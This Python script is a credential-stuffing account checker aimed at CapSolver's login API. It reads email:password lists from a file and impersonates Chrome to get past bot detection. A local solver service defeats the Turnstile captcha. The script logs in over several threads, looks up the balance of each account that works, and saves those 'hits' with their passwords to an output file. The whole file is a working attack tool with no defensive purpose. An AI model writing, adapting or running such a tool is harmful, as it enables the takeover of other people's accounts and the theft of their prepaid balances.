from curl_cffi import requests
import threading
from extvip import log


class capsolver:
    def __init__(self):
        self.session = requests.Session(impersonate="chrome")

    def solver(self):

        # omg = get_turnstile_token(headless=False, url="https://dashboard.capsolver.com/passport/login?redirect=/dashboard", sitekey="0x4AAAAAAAFstVbzplF7A4pv")
        # return omg['turnstile_value']

        url = f"http://127.0.0.1:5000/turnstile?url=https://dashboard.capsolver.com/passport/login?redirect=/dashboard&sitekey=0x4AAAAAAAFstVbzplF7A4pv"

        solve = self.session.get(url)
        return solve.json()['result']

    def check(self, email, password):
        self.current_password = password
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Authorization': 'Bearer null',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://dashboard.capsolver.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json = {
            'email': email,
            'password': password,
            'rememberMe': False,
            "recaptchaToken": self.solver()
        }

        response = requests.post('https://backend.capsolver.com/api/v1/passport-v2/login', headers=headers, json=json)
        res = response.json()

        if 'accessToken' in res and "ey" in res['accessToken']:
            return res['accessToken']
        elif "The email or password is incorrect." in res.get('message', ''):
            log.error(f"BAD: {email}")
            return None
        else:
            log.error(f"HATA - {res}")
            return None

    def bakiye(self, token, email):
        if not token:
            log.error(f"captcha err")
            return

        url = "https://backend.capsolver.com/api/v1/users-v2/me"
        headers = {"Authorization": "Bearer " + token}

        ch = self.session.get(url, headers=headers)
        try:
            balance = ch.json().get('balance', 'idk')
            log.info(f"HIT - {email} BALANCE: {balance}")
            with open("data/output/working.txt", "a") as f:
                f.write(f"{email}:{self.current_password} | Balance: {balance}\n")
        except Exception as e:
            log.error(f"ERR - ({email}): {e}")

class AccountChecker(threading.Thread):
    def __init__(self, g, account):
        threading.Thread.__init__(self)
        self.g = g
        self.account = account

    def run(self):
        email, password = self.account.split(":")
        token = self.g.check(email, password)
        if token:
            self.g.bakiye(token, email)

def main():
    g = capsolver()

    with open("data/input/acc.txt", "r") as file:
        accounts = file.readlines()

    threads = []
    for account in accounts:
        account = account.strip()
        if not account:
            continue

        try:
            email, password = account.split(":")
        except ValueError:
            log.error(f"WRONG FORMAT: {account}")
            continue

        thread = AccountChecker(g, account)
        threads.append(thread)
        thread.start()

        if len(threads) >= 5:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
